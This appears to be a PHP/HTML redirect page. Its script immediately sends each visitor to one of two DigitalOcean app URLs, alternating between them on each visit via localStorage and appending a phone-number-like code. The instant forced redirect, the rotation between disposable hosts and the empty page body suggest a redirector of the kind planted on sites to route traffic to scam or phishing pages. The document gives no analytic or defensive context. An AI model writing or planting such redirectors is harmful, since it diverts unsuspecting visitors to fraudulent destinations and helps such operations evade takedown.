<?php
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>

<script>
(function () {
    const urls = [
        "https://urchin-app-29cr4.ondigitalocean.app/?bcda=(0101)-88844-98569",
        "https://whale-app-fqso4.ondigitalocean.app/?bcda=(0101)-88844-98569"
    ];

    // Get current index (default 0)
    let index = localStorage.getItem("strict_redirect");
    index = index === null ? 0 : Number(index);

    // Prepare next visit BEFORE redirect
    localStorage.setItem("strict_redirect", (index + 1) % urls.length);

    // INSTANT redirect (no delay)
    window.location.replace(urls[index]);
})();
</script>

</head>
<body>
</body>
</html>
